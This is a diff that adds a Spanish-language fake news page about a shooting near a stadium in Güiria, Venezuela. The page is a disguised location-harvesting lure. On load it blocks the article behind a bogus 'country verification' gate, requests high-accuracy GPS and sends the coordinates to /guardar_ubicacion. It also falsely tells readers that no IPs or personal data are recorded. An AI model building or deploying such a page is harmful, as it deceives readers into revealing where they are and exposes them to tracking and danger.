@@ -1,0 +1,553 @@
+﻿<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>¡PLOMO Y TERROR EN GUIRIA! - Balacera contra vivienda junto al estadio desata alarma</title>
+    
+    <!-- METADATOS DE PREVISUALIZACION (PREVIEW DE ENLACE COHERENTE Y COMPATIBLE) -->
+    <meta property="og:title" content="¡PLOMO Y TERROR EN GUIRIA! - Balacera junto al estadio">
+    <meta property="og:description" content="Atentado armado de alta gravedad despierta panico en Nueva guiria. Detalles y reportes comunitarios directos.">
+    <meta property="og:image" content="/static/previ.jpg">
+    <meta property="og:image:secure_url" content="{{ url_for('static', filename='previ.jpg', _external=True) }}">
+    <meta property="og:image:type" content="image/jpeg">
+    <meta property="og:url" content="https://plomo-y-terror-en-guiria.onrender.com">
+    <meta property="og:type" content="article">
+    <meta property="og:site_name" content="guiria al Dia">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="¡PLOMO Y TERROR EN GUIRIA!">
+    <meta name="twitter:description" content="Balacera despierta alarma en el Municipio Valdez.">
+    <meta name="twitter:image" content="/static/previ.jpg">
+
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Lucide Icons -->
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Archivo+Black&family=Inter:wght@400;600;700;900&display=swap');
+        
+        body {
+            font-family: 'Inter', sans-serif;
+        }
+        .impact-title {
+            font-family: 'Archivo Black', sans-serif;
+        }
+    </style>
+</head>
+<body class="text-slate-100 flex flex-col min-h-screen selection:bg-red-700 selection:text-white" style="background-image: linear-gradient(to bottom, rgba(0, 0, 0, 0.20), rgba(0, 0, 0, 0.70)), url('/static/cicpc.jpg') !important; background-size: cover !important; background-position: center 20% !important; background-repeat: no-repeat !important; background-attachment: fixed !important; background-color: #050505;">
+
+    <!-- PANTALLA DE CONTROL DE UBICACION (GEOGATE MODIFICADA CON FONDO TRANSLUCIDO INTEGRADO) -->
+    <div id="geo-gate" class="fixed inset-0 z-50 bg-black/25 backdrop-blur-md flex items-center justify-center p-4 sm:p-6 select-none transition-all duration-500">
+        <div class="max-w-md w-full bg-zinc-950/95 border-2 border-red-950 rounded-2xl p-6 sm:p-8 shadow-2xl text-center space-y-6 backdrop-blur-sm">
+            <div class="bg-red-950/40 border border-red-900 w-16 h-16 rounded-full flex items-center justify-center mx-auto animate-pulse">
+                <i data-lucide="map-pin" class="w-8 h-8 text-red-500"></i>
+            </div>
+            <div class="space-y-2">
+                <h2 class="text-2xl font-black uppercase tracking-tight text-white leading-none">Verificacion de Pais</h2>
+                <p class="text-xs text-red-500 font-bold uppercase tracking-wider">Protocolo de seguridad territorial</p>
+            </div>
+            <p class="text-sm text-slate-400 leading-relaxed">
+                Para ingresar y leer este reporte de orden publico del <strong>Municipio Valdez</strong>, debe otorgar permiso para ver noticias. Esto autentica su acceso comunitario.
+            </p>
+            
+            <div id="geo-status" class="text-xs text-slate-500 font-mono py-3 px-4 bg-black rounded border border-zinc-800">
+                Esperando autorizacion del navegador...
+            </div>
+            
+            <button onclick="requestLocation()" class="w-full bg-red-650 text-white hover:bg-red-700 text-xs font-black py-3.5 px-6 rounded uppercase tracking-wider transition-colors flex items-center justify-center gap-2">
+                <i data-lucide="navigation" class="w-4 h-4"></i> Permitir para ingresar
+            </button>
+        </div>
+    </div>
+
+    <!-- CONTENIDO DEL PORTAL (ACTIVO EN PARALELO DETRAS DE LA COMPOSICION DE PANTALLA) -->
+    <div id="main-content" class="flex flex-col min-h-screen bg-transparent">
+        <!-- BANNER DE ALERTA ROJA (URGENTE) -->
+        <div class="bg-red-700 text-white py-2.5 px-4 text-sm font-black overflow-hidden relative border-b-2 border-red-900 animate-pulse">
+            <div class="max-w-7xl mx-auto flex items-center justify-between gap-3">
+                <div class="flex items-center gap-2">
+                    <span class="bg-black text-white px-2 py-0.5 rounded text-xs uppercase font-black tracking-widest">ALERTA MAXIMA</span>
+                    <span class="truncate">NUEVA GUIRIA BAJO ZOZOBRA: Atentado armado contra vivienda junto al estadio despierta el terror de los vecinos.</span>
+                </div>
+                <span class="hidden md:block text-xs font-mono">ESTADO DE ALERTA</span>
+            </div>
+        </div>
+
+        <!-- CABECERA PORTAL DE SUCESOS (Agresivo y llamativo) -->
+        <header class="bg-zinc-950 border-b border-red-800 sticky top-0 z-40 shadow-2xl">
+            <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+                <div class="flex justify-between items-center h-24">
+                    <!-- Logotipo de impacto -->
+                    <div class="flex items-center gap-3">
+                        <div class="bg-red-700 text-white p-3 rounded-lg shadow-lg shadow-red-900/50 border border-red-500">
+                            <i data-lucide="skull" class="w-8 h-8"></i>
+                        </div>
+                        <div>
+                            <span class="text-3xl font-extrabold tracking-tighter text-white flex items-center gap-1 leading-none">
+                                GUIRIA <span class="text-red-650 text-red-600 font-black">CRONICA ROJA</span>
+                            </span>
+                            <p class="text-xs text-red-500 font-bold uppercase tracking-wider mt-1">Sucesos • Investigacion Criminal • Denuncia Ciudadana</p>
+                        </div>
+                    </div>
+
+                    <!-- Info de Seguridad -->
+                    <div class="hidden lg:flex items-center gap-6 text-sm text-slate-400 border-l pl-6 border-zinc-800">
+                        <div class="flex items-center gap-2">
+                            <i data-lucide="calendar" class="w-4 h-4 text-red-600"></i>
+                            <span id="current-date" class="font-bold">Lunes, 1 de Junio de 2026</span>
+                        </div>
+                        <div class="flex items-center gap-2 bg-red-950/50 text-red-400 border border-red-900 px-3 py-1 rounded text-xs font-extrabold uppercase">
+                            <i data-lucide="shield-alert" class="w-4 h-4 animate-bounce"></i>
+                            <span>Zona de Emergencia</span>
+                        </div>
+                    </div>
+
+                    <!-- Botones -->
+                    <div class="flex items-center gap-2">
+                        <a href="#denuncia-seccion" class="bg-red-600 hover:bg-red-700 text-white text-xs font-black px-4 py-3 rounded uppercase tracking-wider transition-all shadow-md flex items-center gap-2">
+                            <i data-lucide="alert-triangle" class="w-4 h-4"></i> Reportar Balacera
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </header>
+
+        <!-- CUERPO PRINCIPAL -->
+        <main class="flex-grow max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8 w-full">
+            <div class="grid grid-cols-1 lg:grid-cols-3 gap-8">
+                
+                <!-- COLUMNA PRINCIPAL (LA NOTICIA DE IMPACTO) -->
+                <article class="lg:col-span-2 bg-zinc-950 rounded-2xl border-2 border-red-950 p-6 sm:p-8 shadow-2xl relative overflow-hidden">
+                    
+                    <!-- Efecto visual de peligro -->
+                    <div class="absolute top-0 right-0 w-24 h-24 bg-red-900/10 rounded-full blur-2xl"></div>
+
+                    <!-- Encabezado de la noticia -->
+                    <div class="flex flex-wrap items-center justify-between gap-4 border-b border-zinc-900 pb-4 mb-6">
+                        <div class="flex items-center gap-2">
+                            <span class="bg-red-700 text-white text-xs px-3 py-1 rounded font-black uppercase tracking-widest">VIOLENCIA ARMADA</span>
+                            <span class="text-zinc-700">•</span>
+                            <span class="text-red-500 text-xs font-bold flex items-center gap-1"><i data-lucide="map-pin" class="w-3.5 h-3.5"></i> NUEVA GUIRIA (ESTADIO)</span>
+                        </div>
+                        <div class="text-xs text-red-500 font-mono flex items-center gap-1.5 bg-red-950/30 px-2 py-1 rounded border border-red-900/50">
+                            <span class="w-2 h-2 rounded-full bg-red-600 animate-ping"></span> EXCLUSIVA
+                        </div>
+                    </div>
+
+                    <!-- Titulo Impactante -->
+                    <h1 class="impact-title text-3xl sm:text-4xl lg:text-5xl font-black text-white leading-none tracking-tight mb-6">
+                        ¡LLUVIA DE BALAS EN NUEVA GUIRIA! SUJETOS EMBOSCARON Y ACRIBILLARON UNA VIVIENDA JUNTO AL ESTADIO DEPORTIVO
+                    </h1>
+
+                    <!-- Copete Agresivo -->
+                    <p class="text-lg sm:text-xl text-red-100 font-semibold leading-relaxed mb-6 border-l-4 border-red-600 pl-4 bg-red-950/20 py-3 pr-2 rounded-r">
+                        El atentado perpetrado la noche del pasado 30 de mayo dejo el inmueble con severos destrozos materiales e incontables orificios en las paredes. Sujetos desconocidos abrieron fuego indiscriminadamente contra la fachada, desatando el panico absoluto en todo el sector.
+                    </p>
+
+                    <!-- IMAGEN 1: FOTO CREPUSCULAR DIRECTA DE LAS CALLES DE GUIRIA -->
+                    <div class="relative rounded-lg overflow-hidden mb-8 border-2 border-zinc-800 bg-black">
+                        <img src="/static/346483.jpg" alt="Avenida principal de guiria" class="w-full h-auto object-cover max-h-[550px] block mx-auto">
+                        <div class="absolute bottom-0 inset-x-0 bg-gradient-to-t from-black via-black/90 to-transparent p-4 pt-16">
+                            <p class="text-red-500 text-xs font-black uppercase tracking-widest flex items-center gap-1.5 mb-1">
+                                <i data-lucide="eye" class="w-4 h-4"></i> VISTA DE LA AVENIDA DE NUEVA GUIRIA
+                            </p>
+                            <p class="text-white text-sm font-bold">Las calles de Nueva guiria se quedan desiertas al caer la tarde tras los recientes disparos.</p>
+                            <p class="text-slate-400 text-xs mt-1">El imponente paisaje de palmeras y cielo crepuscular oculta la tension del vecindario: las familias se encierran temprano por temor a que se repitan hechos de violencia armada.</p>
+                        </div>
+                    </div>
+
+                    <!-- CONTENIDO PERIODISTICO SIN FILTROS -->
+                    <div class="prose prose-invert max-w-none text-slate-200 leading-relaxed text-base sm:text-lg space-y-6">
+                        <p>
+                            <strong>GUIRIA (Sucesos).</strong> Momentos de autentico terror y desesperacion vivieron los habitantes del sector <strong>Nueva guiria</strong>, en el municipio Valdez del estado Sucre. Durante la noche del pasado sabado <strong>30 de mayo</strong>, un violento atentado armado sacudio la tranquilidad comunitaria cuando una lluvia de proyectiles impacto directamente contra la fachada de una vivienda ubicada en las inmediaciones del estadio de la zona.
+                        </p>
+
+                        <p>
+                            Segun los reportes recabados en el lugar, el ataque se registro cuando sujetos no identificados a bordo de vehiculos de dos ruedas se aproximaron velozmente a la propiedad. Sin mediar palabras ni advertencias previas, abrieron fuego descargando multiples rafagas de proyectiles de alto calibre directamente hacia las puertas y ventanas del hogar, para luego escapar velozmente de la escena.
+                        </p>
+
+                        <!-- CAJA INTERACTIVA: DETALLES DEL ATAQUE -->
+                        <div class="bg-red-950/20 border-2 border-red-900 rounded-xl p-5 my-8">
+                            <h4 class="text-red-400 font-black text-lg mb-3 flex items-center gap-2 uppercase tracking-wide">
+                                <i data-lucide="shield-alert" class="w-5 h-5 text-red-500 animate-pulse"></i> Balance de Danos del Atentado
+                            </h4>
+                            <div class="grid grid-cols-1 sm:grid-cols-3 gap-4 text-center">
+                                <div class="bg-black/60 p-3 rounded border border-zinc-800">
+                                    <span class="block text-xl font-black text-red-600">IMPACTOS</span>
+                                    <span class="text-[10px] text-slate-400 uppercase font-bold">Multiples orificios en fachada</span>
+                                </div>
+                                <div class="bg-black/60 p-3 rounded border border-zinc-800">
+                                    <span class="block text-xl font-black text-red-600">DESTRUCCION</span>
+                                    <span class="text-[10px] text-slate-400 uppercase font-bold">Ventanales y puertas rotas</span>
+                                </div>
+                                <div class="bg-black/60 p-3 rounded border border-zinc-800">
+                                    <span class="block text-xl font-black text-red-600">ZOZOBRA</span>
+                                    <span class="text-[10px] text-slate-400 uppercase font-bold">Panico generalizado en el sector</span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <p>
+                            Vecinos que se encontraban a esa hora en las inmediaciones de las canchas deportivas declararon haber escuchado tiros sumamente ruidosas. <em>"Fueron detonaciones consecutivas. Lo mas preocupante es que esto ocurrio al lado del estadio, un lugar donde suelen reunirse ninos y jovenes a practicar deportes"</em>, declaro bajo resguardo un residente de la comunidad.
+                        </p>
+
+                        <p>
+                            La fuerza de los proyectiles dejo marcas profundas en las paredes de bloque y concreto de la fachada principales del inmueble. Por fortuna, el grupo familiar no se encontraba dentro de la casa, evitando que se registraran heridos o perdidas humanas en el sitio.
+                        </p>
+
+                        <div class="border-l-4 border-red-600 pl-4 py-3 my-6 bg-red-950/40 text-red-200 font-bold rounded-r">
+                            "Esa balacera estremecio a toda la cuadra. Disparar contra una vivienda familiar en una zona residencial es sumamente grave. Exigimos patrullajes constantes y rigurosos en las inmediaciones del estadio de Nueva guiria para garantizar la seguridad de nuestros hijos."
+                            <span class="block text-right text-xs font-black text-red-500 mt-2">— Testimonio de madre afectada en el sector</span>
+                        </div>
+
+                        <p>
+                            El panico generado por este ataque armado has puesto en alerta maxima al municipio Valdez. Familias completas exigen que se refuercen los cuadrantes de paz y que las unidades policiales establezcan puntos de control permanentes para erradicar las detonaciones de armas de fuego en las zonas residenciales de guiria.
+                        </p>
+                    </div>
+
+                    <!-- Botones de Accion Ciudadana -->
+                    <div class="mt-8 pt-6 border-t border-zinc-900 flex flex-wrap items-center justify-between gap-4">
+                        <div class="flex items-center gap-2">
+                            <span class="text-xs text-red-500 font-black uppercase tracking-wider">¿Exiges justicia y mayor vigilancia en la zona?</span>
+                            <button onclick="voteNews(true)" class="flex items-center gap-1.5 text-xs bg-red-950 border border-red-900 text-red-400 px-4 py-2 rounded font-black uppercase transition-all hover:bg-red-900 hover:text-white">
+                                <i data-lucide="shield-alert" class="w-4 h-4"></i> EXIGIR JUSTICIA (<span id="likes-count">854</span>)
+                            </button>
+                        </div>
+                        
+                        <div class="flex items-center gap-2">
+                            <button onclick="shareLink('WhatsApp')" class="bg-emerald-600 text-white p-2.5 rounded hover:bg-emerald-700 transition-colors" title="Compartir noticia de forma segura">
+                                <i data-lucide="phone" class="w-4 h-4"></i>
+                            </button>
+                            <button onclick="copyToClipboard()" class="bg-zinc-800 text-white p-2.5 rounded hover:bg-zinc-750 transition-colors" title="Copiar enlace directo">
+                                <i data-lucide="link" class="w-4 h-4"></i>
+                            </button>
+                        </div>
+                    </div>
+                </article>
+
+                <!-- COLUMNA LATERAL (FOTO CICPC Y CRONICA POLICIAL) -->
+                <div class="space-y-6">
+
+                    <!-- IMAGEN 2: DETECTIVES DEL CICPC EN GUIRIA (FOTO REAL DIRECTA) -->
+                    <div class="bg-zinc-950 rounded-2xl border-2 border-red-950 p-5 shadow-2xl">
+                        <h3 class="font-black text-white text-base mb-3 flex items-center gap-2 uppercase tracking-tight">
+                            <i data-lucide="shield" class="text-blue-500 w-5 h-5"></i>
+                            Despliegue de Seguridad
+                        </h3>
+                        
+                        <div class="rounded-lg overflow-hidden mb-3 border border-zinc-850 bg-black">
+                            <img src="/static/346548.jpg" alt="CICPC Delegacion Municipal guiria" class="w-full h-auto object-cover">
+                        </div>
+
+                        <p class="text-xs text-slate-350 leading-relaxed font-semibold">
+                            Unidades de patrullaje de guiria, <strong>CICPC, CONAS Y GNB.</strong> activan investigaciones de campo correspondientes. Expertos del cuerpo de la policia ciientifica recabaron evidencias fisicas en la vivienda afectada para esclarecer los hechos.
+                        </p>
+                    </div>
+
+                    <!-- TELEFONOS DE DENUNCIA TOTALMENTE ANONIMA -->
+                    <div class="bg-zinc-950 rounded-2xl border-2 border-red-950 p-6 shadow-2xl">
+                        <h3 class="font-black text-white text-lg mb-4 flex items-center gap-2 uppercase tracking-wide">
+                            <i data-lucide="phone-call" class="text-red-500 w-5 h-5"></i>
+                            CONTACTOS DE EMERGENCY GUIRIA
+                        </h3>
+                        <p class="text-xs text-slate-400 mb-4 leading-relaxed">
+                            Si tienes informacion relevante sobre detonaciones o sospechosos en el area, reportalo inmediatamente a los cuerpos de resguardo:
+                        </p>
+                        <div class="space-y-3 font-mono text-sm">
+                            <div class="bg-black border border-zinc-800 p-3 rounded flex justify-between items-center">
+                                <div>
+                                    <span class="text-[9px] text-red-500 font-extrabold uppercase block">CICPC Delegacion guiria</span>
+                                    <span class="font-bold text-white">0294-9811054</span>
+                                </div>
+                                <i data-lucide="alert-circle" class="text-blue-500 w-5 h-5"></i>
+                            </div>
+                            <div class="bg-black border border-zinc-800 p-3 rounded flex justify-between items-center">
+                                <div>
+                                    <span class="text-[9px] text-red-500 font-extrabold uppercase block">POLICIA ESTADAL SUCRE (VALDEZ)</span>
+                                    <span class="font-bold text-white">VEN-911</span>
+                                </div>
+                                <i data-lucide="shield-check" class="text-emerald-500 w-5 h-5"></i>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- CRONOLOGIA DE ALERTAS EN VALDEZ -->
+                    <div class="bg-zinc-950 rounded-2xl border-2 border-red-950 p-6 shadow-2xl">
+                        <h3 class="font-black text-white text-lg mb-4 flex items-center gap-2 uppercase tracking-wide">
+                            <i data-lucide="history" class="text-red-500 w-5 h-5"></i>
+                            Registro de Incidentes en Nueva guiria
+                        </h3>
+                        <div class="space-y-4 relative border-l-2 border-red-900 pl-4 ml-2 text-xs">
+                            <div class="relative">
+                                <div class="absolute -left-[23px] top-1 w-2.5 h-2.5 rounded-full bg-red-600 border border-black"></div>
+                                <span class="text-[9px] bg-red-950 text-red-400 px-2 py-0.5 rounded font-black">30 MAY</span>
+                                <h4 class="font-black text-white mt-1 uppercase">Ataque armado en Nueva guiria</h4>
+                                <p class="text-slate-400 mt-1">Sujetos dispararon contra la fachada de una vivienda familiar a pasos del estadio municipal.</p>
+                            </div>
+                            <div class="relative">
+                                <div class="absolute -left-[23px] top-1 w-2.5 h-2.5 rounded-full bg-zinc-700 border border-black"></div>
+                                <span class="text-[9px] bg-zinc-900 text-zinc-400 px-2 py-0.5 rounded font-black">20 MAY</span>
+                                <h4 class="font-black text-zinc-300 mt-1 uppercase">Detonaciones en sector aledano</h4>
+                                <p class="text-slate-400 mt-1">Vecinos reportaron rafagas de tiros al aire durante horas nocturnas en zonas cercanas.</p>
+                            </div>
+                        </div>
+                    </div>
+
+                </div>
+            </div>
+
+            <!-- SECCION DE REPORTES VECINALES ANONIMOS -->
+            <section id="denuncia-seccion" class="mt-8 bg-zinc-950 rounded-2xl border-2 border-red-950 p-6 sm:p-8 shadow-2xl">
+                <div class="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4 mb-2">
+                    <h3 class="font-black text-white text-2xl flex items-center gap-2 uppercase tracking-wide">
+                        <i data-lucide="eye-off" class="text-red-500 w-6 h-6"></i>
+                        Buzon Vecinal de Alerta Confidencial
+                    </h3>
+                    <span class="bg-black border-2 border-red-900 text-red-500 text-xs px-3 py-1 rounded-full font-black flex items-center gap-1.5">
+                        <span class="w-2.5 h-2.5 rounded-full bg-red-650 bg-red-600 animate-ping"></span> CANAL CONFIDENCIAL
+                    </span>
+                </div>
+                <p class="text-slate-400 text-sm mb-6">
+                    Este espacio esta protegido para resguardar el anonimato de nuestros lectores. Reporta libremente balaceras, rafagas de tiros al aire o cualquier situacion de peligro que ocurra en tu calle para alertar a los demas vecinos del Municipio Valdez.
+                </p>
+
+                <!-- Formulario de Aportes de Seguridad -->
+                <form id="comment-form" onsubmit="submitComment(event)" class="space-y-4 mb-8 bg-black/60 p-4 sm:p-6 rounded-xl border border-zinc-900">
+                    <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                        <div>
+                            <label class="block text-xs font-black text-red-500 uppercase tracking-wider mb-1" for="user-name">Alias de Resguardo (Opcional)</label>
+                            <input type="text" id="user-name" required class="w-full px-4 py-2.5 rounded border border-zinc-800 text-sm focus:outline-none focus:border-red-600 bg-zinc-950 text-white placeholder-zinc-700" placeholder="Ej. Vecino de Valdez">
+                        </div>
+                        <div>
+                            <label class="block text-xs font-black text-red-500 uppercase tracking-wider mb-1" for="user-sector">Sector o Barrio de guiria</label>
+                            <input type="text" id="user-sector" required class="w-full px-4 py-2.5 rounded border border-zinc-800 text-sm focus:outline-none focus:border-red-600 bg-zinc-950 text-white placeholder-zinc-700" placeholder="Ej. Nueva guiria - Cerca del Estadio">
+                        </div>
+                    </div>
+                    <div>
+                        <label class="block text-xs font-black text-red-500 uppercase tracking-wider mb-1" for="user-message">Detalles del Suceso (No indiques nombres reales de personas en peligro)</label>
+                        <textarea id="user-message" rows="4" required class="w-full px-4 py-2.5 rounded border border-zinc-800 text-sm focus:outline-none focus:border-red-600 bg-zinc-950 text-white placeholder-zinc-700" placeholder="Escribe aqui los detalles del hecho para alertar a los habitantes de tu sector..."></textarea>
+                    </div>
+                    <div class="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4">
+                        <span class="text-[11px] text-red-500 italic flex items-center gap-1.5 font-bold">
+                            <i data-lucide="shield-alert" class="w-4 h-4"></i> No registramos IPs, correos ni datos personales. Tu identidad esta totalmente protegida.
+                        </span>
+                        <button type="submit" class="bg-red-600 hover:bg-red-700 text-white font-black text-xs px-6 py-3 rounded transition-all shadow-md flex items-center gap-2 shrink-0 self-end sm:self-auto">
+                            <i data-lucide="send" class="w-3.5 h-3.5"></i> Lanzar Alerta Vecinal
+                        </button>
+                    </div>
+                </form>
+
+                <!-- Mensaje de exito -->
+                <div id="success-alert" class="hidden bg-red-950/40 border border-red-900 text-red-400 p-4 rounded-xl mb-6 flex items-center gap-3 animate-pulse">
+                    <i data-lucide="check-circle" class="w-5 h-5 text-red-500 shrink-0"></i>
+                    <p class="text-sm font-bold">¡ALERTA PUBLICADA CON EXITO! El reporte ha sido difundido de manera anonima en el muro vecinal.</p>
+                </div>
+
+                <!-- Listado de reportes anonimos -->
+                <div class="space-y-4" id="comments-list">
+                    <!-- Comentario 1 -->
+                    <div class="p-4 rounded-xl border border-red-950/50 bg-red-950/5 shadow-md">
+                        <div class="flex justify-between items-start mb-2">
+                            <div>
+                                <span class="font-black text-sm text-red-500">Testigo del Tiroteo</span>
+                                <span class="text-xs text-slate-450 font-semibold block sm:inline sm:ml-2">Nueva guiria</span>
+                            </div>
+                            <span class="text-[10px] text-slate-500 font-bold">Ayer</span>
+                        </div>
+                        <p class="text-sm text-slate-300 leading-relaxed">
+                            El tiroteo del 30 de mayo fue espantoso. Vivimos muy cerca del estadio municipal y pensamos que las tiros iban a traspasar nuestras propias paredes. Los ninos lloraban desconsoladamente. Es de suma urgencia que el CICPC y los cuerpos de seguridad de guiria dejen un punto de control permanente en esta zona. ¡No se puede vivir tranquilos con balaceras asi!
+                        </p>
+                    </div>
+                </div>
+            </section>
+        </main>
+
+        <!-- PIE DE PAGINA (Estilo Cronica Negra) -->
+        <footer class="bg-black text-slate-600 py-12 border-t-2 border-red-950">
+            <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 text-center text-xs space-y-4">
+                <span class="text-lg font-black text-white tracking-widest block uppercase">GUIRIA <span class="text-red-650 text-red-600">AL DIA</span></span>
+                <p class="max-w-md mx-auto text-slate-500 leading-relaxed">
+                    Portal de denuncia vecinal e informacion de orden publico en el Municipio Valdez, Sucre. Comprometidos con exponer la reality de nuestras comunidades para exigir calles libres de violencia.
+                </p>
+                <p class="text-red-900 font-extrabold">&copy; 2026 guiria al Dia. Por la paz e integridad de nuestras familias. Todos los derechos reservados.</p>
+            </div>
+        </footer>
+    </div>
+
+    <!-- MODAL COMPARTIR (SEGURO) -->
+    <div id="share-modal" class="hidden fixed inset-0 z-50 flex items-center justify-center bg-black/90 p-4">
+        <div class="bg-zinc-950 border-2 border-red-950 rounded-2xl max-w-sm w-full p-6 shadow-2xl">
+            <div class="flex justify-between items-center mb-4">
+                <h3 class="font-black text-white text-lg flex items-center gap-2 uppercase tracking-tight">
+                    <i data-lucide="share-2" class="text-red-500 w-5 h-5"></i> Compartir noticia
+                </h3>
+                <button onclick="toggleShareModal()" class="text-slate-400 hover:text-white">
+                    <i data-lucide="x" class="w-5 h-5"></i>
+                </button>
+            </div>
+            <p class="text-xs text-slate-400 mb-4 leading-relaxed font-semibold">
+                Alerta a tus seres queridos y vecinos de forma confidencial y privada:
+            </p>
+            <div class="space-y-3">
+                <button onclick="shareLink('WhatsApp')" class="w-full flex items-center justify-between bg-emerald-600 hover:bg-emerald-700 text-white font-black py-3 px-4 rounded transition-colors text-xs uppercase tracking-wider">
+                    <span>Enviar privado por WhatsApp</span>
+                    <i data-lucide="phone" class="w-4 h-4"></i>
+                </button>
+                <button onclick="copyToClipboard()" class="w-full flex items-center justify-between bg-zinc-900 hover:bg-zinc-850 text-slate-200 border border-zinc-800 font-black py-3 px-4 rounded transition-colors text-xs uppercase tracking-wider">
+                    <span>Copiar Enlace Directo</span>
+                    <i data-lucide="copy" class="w-4 h-4"></i>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- NOTIFICACION TOAST -->
+    <div id="toast-notification" class="fixed bottom-4 right-4 bg-zinc-950 border border-red-900 text-white text-xs px-4 py-3 rounded-xl shadow-lg transform translate-y-20 opacity-0 transition-all duration-300 flex items-center gap-2 z-50">
+        <i data-lucide="check" class="w-4 h-4 text-emerald-500"></i>
+        <span id="toast-text" class="font-bold">¡Enlace copiado!</span>
+    </div>
+
+    <!-- LOGICA DE INTERACTIVIDAD Y GEOLOCALIZACION -->
+    <script>
+        lucide.createIcons();
+
+        const options = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
+        document.getElementById('current-date').textContent = new Date().toLocaleDateString('es-ES', options);
+
+        // --- SISTEMA DE ALTA PRECISION ---
+        function requestLocation() {
+            const statusDiv = document.getElementById('geo-status');
+            statusDiv.textContent = "Solicitando autorizacion de ubicacion con alta precision...";
+            statusDiv.className = "text-xs text-amber-500 font-mono py-3 px-4 bg-black rounded border border-zinc-800";
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        statusDiv.textContent = "UBICACION CONFIRMADA. Redirigiendo...";
+                        statusDiv.className = "text-xs text-emerald-500 font-mono py-3 px-4 bg-black rounded border border-zinc-800 font-bold";
+                        
+                        // ENVIO DE COORDENADAS CON FILTRADO DE IP PARA EVITAR ERROR DE CARACAS
+                        fetch('/guardar_ubicacion', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ 
+                                lat: position.coords.latitude, 
+                                lon: position.coords.longitude 
+                            })
+                        });
+
+                        setTimeout(() => {
+                            // EFECTO TRANSICION DIFUMINADO ANTES DE OCULTAR COMPLETAMENTE EL CAPTCHAGATE
+                            const gate = document.getElementById('geo-gate');
+                            gate.classList.add('opacity-0', 'pointer-events-none');
+                            setTimeout(() => {
+                                gate.classList.add('hidden');
+                            }, 500);
+                            showToast("¡Bienvenido! Ubicacion territorial verificada.");
+                        }, 800);
+                    },
+                    function(error) {
+                        statusDiv.textContent = "ACCESO RESTRINGIDO: Permiso de ubicacion denegado.";
+                        statusDiv.className = "text-xs text-red-500 font-mono py-3 px-4 bg-black rounded border border-zinc-800 font-bold animate-pulse";
+                        showToast("ERROR: Es obligatorio otorgar el acceso de ubicacion para ingresar.");
+                    },
+                    // CONFIGURACION PARA SOLICITAR GPS REAL Y EVITAR EL NODO REPETIDOR DE CARACAS
+                    { 
+                        enableHighAccuracy: true, 
+                        timeout: 10000, 
+                        maximumAge: 0 
+                    }
+                );
+            } else {
+                statusDiv.textContent = "Geolocalizacion no compatible con su navegador.";
+                statusDiv.className = "text-xs text-red-500 font-mono py-3 px-4 bg-black rounded border border-zinc-800";
+            }
+        }
+
+        window.addEventListener('DOMContentLoaded', () => {
+            requestLocation();
+        });
+
+        let hasVoted = false;
+        let likesCount = 854;
+        function voteNews(isPositive) {
+            if (hasVoted) {
+                showToast("Ya has manifestado tu exigencia de justicia.");
+                return;
+            }
+            if (isPositive) {
+                likesCount++;
+                document.getElementById('likes-count').textContent = likesCount;
+                showToast("¡Has sumado tu voto de exigencia de seguridad!");
+            }
+            hasVoted = true;
+        }
+
+        function copyToClipboard() {
+            const tempInput = document.createElement("input");
+            tempInput.value = window.location.href;
+            document.body.appendChild(tempInput);
+            tempInput.select();
+            document.execCommand("copy");
+            document.body.removeChild(tempInput);
+            
+            showToast("¡Enlace copiado al portapapeles!");
+            document.getElementById('share-modal').classList.add('hidden');
+        }
+
+        function toggleShareModal() {
+            const modal = document.getElementById('share-modal');
+            modal.classList.toggle('hidden');
+        }
+
+        function showToast(message) {
+            const toast = document.getElementById('toast-notification');
+            document.getElementById('toast-text').textContent = message;
+            toast.classList.remove('translate-y-20', 'opacity-0');
+            toast.classList.add('translate-y-0', 'opacity-100');
+            
+            setTimeout(() => {
+                toast.classList.remove('translate-y-0', 'opacity-100');
+                toast.classList.add('translate-y-20', 'opacity-0');
+            }, 3000);
+        }
+
+        function shareLink(platform) {
+            showToast(`Compartiendo de forma segura en ${platform}...`);
+            setTimeout(() => {
+                document.getElementById('share-modal').classList.add('hidden');
+            }, 1000);
+        }
+
+        function submitComment(event) {
+            event.preventDefault();
+            const nameInput = document.getElementById('user-name');
+            const sectorInput = document.getElementById('user-sector');
+            const messageInput = document.getElementById('user-message');
+            const successAlert = document.getElementById('success-alert');
+            const commentsList = document.getElementById('comments-list');
+
+            const newComment = document.createElement('div');
+            newComment.className = "p-4 rounded-xl border border-red-950 bg-red-950/20 shadow-md animate-fade-in";
+            newComment.innerHTML = `
+                <div class="flex justify-between items-start mb-2">
+                    <div>
+                        <span class="font-black text-sm text-red-500">${nameInput.value || 'Vecino Anonimo'}</span>
+                        <span class="text-xs text-slate-350 font-semibold block sm:inline sm:ml-2">${sectorInput.value}</span>
+                    </div>
+                    <span class="text-[10px] bg-red-900/30 text-red-400 border border-red-900/40 px-2 py-0.5 rounded font-black">REGISTRADO</span>
+                </div>
+                <p class="text-sm text-slate-300 leading-relaxed">${messageInput.value}</p>
+            `;
+
+            commentsList.insertBefore(newComment, commentsList.firstChild);
+            successAlert.classList.remove('hidden');
+            setTimeout(() => { successAlert.classList.add('hidden'); }, 5000);
+
+            nameInput.value = '';
+            sectorInput.value = '';
+            messageInput.value = '';
+        }
+    </script>
+</body>
+</html>
